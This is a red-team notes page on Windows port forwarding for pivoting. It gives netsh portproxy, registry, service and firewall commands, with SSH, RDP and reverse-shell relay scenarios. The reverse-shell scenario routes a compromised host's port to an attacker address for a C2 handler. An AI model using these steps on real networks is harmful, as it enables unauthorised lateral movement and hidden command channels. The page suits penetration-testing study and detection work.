# Living off the Land

## 01 - Usage

> [!IMPORTANT] Conditions
>  [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Windows/Host/0xB - Networking/Network Configuration/Packet Forwarding|Packet forwarding]] must be enabled.

```
C:\> reg.exe add [\\<IP>\]HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters /v IPEnableRouter /t REG_DWORD /d 0x1 /f
```

```
PS C:\> Set-NetIPInterface -Forwarding Enabled
```

Both services of `IP Helper` and **IPv6 support** must be enabled. To ensure they're enabled here are the following commands:

```
C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\iphlpsvc" /v Start /t REG_DWORD /d 2 /f

C:\> sc.exe [\\<IP>] config iphlpsvc start= auto

C:\> net.exe start "IP Helper"

C:\> sc.exe [\\<IP>] start iphlpsvc
```

> [!NOTE] Elevated Privileges is Required
> `netsh interface portproxy` must be executed with administrative rights.

```
C:\> netsh.exe interface portproxy add <v4tov4 | v4tov6 | v6tov4 | v6tov6> listenport=<LPORT> listenaddress=<LHOST> connectport=<FPORT> connectaddress=<FHOST>
```

Display port forwarding rules.

```
C:\> netsh.exe interface portproxy show <all | v4tov4 | v4tov6 | v6tov4 | v6tov6>
```

Delete port forwarding rule.

```
C:\> netsh.exe interface portproxy delete v4tov4 listenaddress=<LHOST> listenport=<LPORT>
```

Flush port forwarding rules.

```
C:\> netsh.exe interface portproxy reset [ipv4 | ipv6]
```

## 02 - Scenarios

### 2.1 - Bind SSH Port

Grab the SSH port number

```
C:\> netsh.exe interface portproxy add v4tov4 listenport=4242 listenaddress=<pivot_IP | 0.0.0.0> connectport=22 connectaddress=192.168.0.101
```

In command prompt

```
C:\> netstat.exe -anp TCP | find.exe "4242"

C:\> tasklist.exe | findstr.exe :4242
```

In powershell

```
PS C:\> Test-NetConnection -ComputerName localhost -Port 4242
```

Add a firewall rule

```
C:\> netsh.exe advfirewall firewall add rule name="Port Forward SSH" protocol=tcp dir=in localip=<pivot_IP> localport=4242 action=allow
```

Remotely authenticate SSH server

```
$ ssh <username>@<pivot_IP> -p 4242
```

### 2.2 - Bind RDP Port

Grab the RDP port number

```
C:\> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=<pivot_IP | 0.0.0.0> connectport=3389 connectaddress=<RDP_IP>
```

In command prompt

```
C:\> netstat.exe -na | findstr.exe "8080"

C:\> tasklist.exe | findstr.exe :8080
```

In powershell

```
PS C:\> Test-NetConnection -ComputerName localhost -Port 8080
```

Add a firewall rule

```
C:\> netsh.exe advfirewall firewall add rule name="Port Forward RDP" protocol=tcp dir=in localip=<pivot_IP> localport=8080 action=allow
```

Remotely authenticate RDP server

```
$ xfreerdp /v:<pivot_IP>:8080 /u:<username> /p:<password> /sec:<rdp | tls | nla>
```

### 2.3 - Remote Port Forwarding Reverse Shells

Port forward the reverse shell handler.

```
C:\> netsh.exe interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=8443 connectaddress=<attacker_IP>
```

Check for 8443 listening port in command prompt.

```
C:\> netstat.exe -na | findstr.exe "8443"

C:\> tasklist.exe | findstr.exe :8443
```

Check for 8443 listening port in powershell.

```
PS C:\> Test-NetConnection -ComputerName localhost -Port 8443
```

Add a firewall rule

```
C:\> netsh.exe advfirewall firewall add rule name="Port Forward Payload" protocol=tcp dir=in localip=<compromised_pivot_IP> localport=8443 action=allow
```

Then you can launch a reverse shell handler with any C2 frameworks. Just specify the compromised system's IP and PORT.

---
## References

### Backlinks

- [[Rinetd]]

### InternalAllTheThings

- [InternalAllTheThings: Network Pivoting Techniques](https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/)

### Slayer Labs

- [Slayer Labs: Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)

- [Slayer Labs: Kerberos Double-Hop Workarounds](https://posts.slayerlabs.com/double-hop/)

### Shell is Coming

- [Shell is coming: Metasploit Chain of Proxies](https://www.shelliscoming.com/2013/08/metasploit-chain-of-proxies-with.html)

### DFIR Notes

- [DFIR Notes: PortProxy Detection](https://www.dfirnotes.net/portproxy_detection/)